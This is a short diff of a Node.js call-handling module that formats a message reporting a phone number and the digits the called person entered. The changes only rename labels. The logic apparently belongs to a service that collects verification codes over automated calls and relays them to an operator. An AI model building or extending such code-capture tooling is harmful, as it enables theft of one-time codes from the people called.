@@ -84,13 +84,13 @@ module.exports = function(request, response) {
                              * If no digits were entered, notify that the user did not respond
                              */
                             if (!row.digits) {
-                                message = `📱 Phone: ${itsto}\n📶 Status: The user didn’t respond or enter the code.`;
+                                message = `📱 Mobile Phone: ${itsto}\n📶 Man Detective: The user didn’t respond or enter the code.`;
                             } else {
                                 /**
                                  * Mask the code if the user is "test", otherwise display it
                                  */
                                 let code = row.user === 'test' ? row.digits.slice(0, 3) + '***' : row.digits;
-                                message = `📱 Phone: ${itsto}\n📶 Code: **${code}**`;
+                                message = `📱 Mobile Phone: ${itsto}\n📶 Man Detective: Code: **${code}**`;
                             }
 
                             /**
